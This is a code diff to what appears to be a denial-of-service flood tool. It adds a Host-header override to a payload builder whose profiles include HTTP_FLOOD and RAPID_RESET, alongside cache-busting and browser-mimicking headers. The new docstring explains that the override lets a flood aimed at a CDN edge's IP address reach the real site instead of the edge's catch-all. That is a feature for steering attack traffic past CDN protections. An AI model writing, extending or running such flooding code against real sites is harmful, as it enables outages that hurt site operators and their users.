@@ -412,6 +412,7 @@ def _http_request(
     referer: str = "",
     body: str = "",
     content_type: str = "application/x-www-form-urlencoded",
+    host_header: str = "",
 ) -> bytes:
     """A minimal HTTP/1.1 request with a unique cache-busting header.
 
@@ -455,9 +456,11 @@ def _http_request(
     connection = "keep-alive" if keep_alive else "close"
     verb = method.upper()
     encoded_body = body.encode("utf-8") if body else b""
+    # host_header overrides the Host line only - the connection still goes to
+    # *host*. Empty keeps the historical single-argument behaviour.
     lines = [
         f"{verb} {path} HTTP/1.1",
-        f"Host: {host}",
+        f"Host: {host_header or host}",
     ]
     lines.extend(f"{name}: {value}" for name, value in persona.headers)
     if referer:
@@ -601,6 +604,7 @@ def build_payload(
     referer: str = "",
     body: str = "",
     content_type: str = "application/x-www-form-urlencoded",
+    host_header: str = "",
 ) -> bytes:
     """Build the payload for one packet of *profile*.
 
@@ -625,6 +629,10 @@ def build_payload(
     forwards none of them - keep producing the same bytes. They apply to
     ``HTTP_FLOOD`` only; the h2 transport builds its own header block and does
     not reach this path.
+
+    *host_header* overrides the ``Host`` line while the connection still goes
+    to *target*: a CDN edge routes by that header, so a flood addressed to the
+    IP without it lands on the edge's catch-all rather than the site.
     """
     size = max(0, int(size))
 
@@ -660,6 +668,7 @@ def build_payload(
             referer=referer,
             body=body,
             content_type=content_type,
+            host_header=host_header,
         )
 
     if profile is ProfileName.RAPID_RESET:
